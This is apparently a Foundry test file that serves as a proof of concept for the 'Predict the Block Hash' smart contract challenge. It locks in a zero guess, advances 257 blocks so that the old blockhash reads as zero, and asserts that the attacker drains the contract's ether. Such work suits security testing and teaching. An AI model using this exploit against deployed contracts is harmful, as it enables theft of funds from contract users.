// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/old_blockhash.sol";

contract PredictTheBlockHashChallengeTest is Test {
    PredictTheBlockHashChallenge public challenge;
    address public attacker = address(0x123);

    function setUp() public {
        // Deploy challenge contract with 1 ETH
        challenge = new PredictTheBlockHashChallenge{value: 1 ether}();
        
        // Fund attacker with 1 ETH
        vm.deal(attacker, 1 ether);
    }

    function testBlockhashRandomnessExploit() public {
        // Start attack from attacker address
        vm.startPrank(attacker);

        // Lock in guess at block 2
        vm.roll(2);
        bytes32 zeroHash = bytes32(0);
        challenge.lockInGuess{value: 1 ether}(zeroHash); // Target block = 3
        
        // Advance to block 260 (257 blocks after target block 3)
        vm.roll(260);
        
        console.log("--- BEFORE-Trigger Settlement ---");
        uint256 contractBalanceBefore = address(challenge).balance;
        uint256 playerWinsBefore = challenge.playerWins(attacker);
        uint256 totalWinsBefore = challenge.totalWinners();
        console.log("Contract ETH balance: %s", contractBalanceBefore);
        console.log("Attacker wins: %s", playerWinsBefore);
        console.log("Total wins: %s", totalWinsBefore);
        
        console.log("--- Trigger Settlement ---");
        challenge.settle();
        console.log("--- AFTER-Trigger Settlement ---");
        
        uint256 contractBalanceAfter = address(challenge).balance;
        uint256 playerWinsAfter = challenge.playerWins(attacker);
        uint256 totalWinsAfter = challenge.totalWinners();
        console.log("Contract ETH balance: %s", contractBalanceAfter);
        console.log("Attacker wins: %s", playerWinsAfter);
        console.log("Total wins: %s", totalWinsAfter);
        
        console.log("--- State Change Validation ---");
        console.log(unicode"Contract balance: %s → %s", contractBalanceBefore, contractBalanceAfter);
        console.log(unicode"Attacker wins: %s → %s", playerWinsBefore, playerWinsAfter);
        console.log(unicode"Total wins: %s → %s", totalWinsBefore, totalWinsAfter);
        
        // Vulnerability verification conditions
        bool balanceDrained = contractBalanceAfter == 0;
        bool attackerWon = playerWinsAfter > playerWinsBefore;
        bool winsIncreased = totalWinsAfter > totalWinsBefore;
        
        if (balanceDrained && attackerWon && winsIncreased) {
            console.log("Vulnerability Exists: Exploit successfully drained contract and incremented win counters");
        } else {
            console.log("Vulnerability not Exist: State changes don't indicate successful exploitation");
        }

        // Final asserts (required for test success)
        assertEq(attacker.balance, 2 ether, "Attacker should receive 2 ETH");
        assertEq(address(challenge).balance, 0, "Challenge contract should be drained");

        vm.stopPrank();
    }
}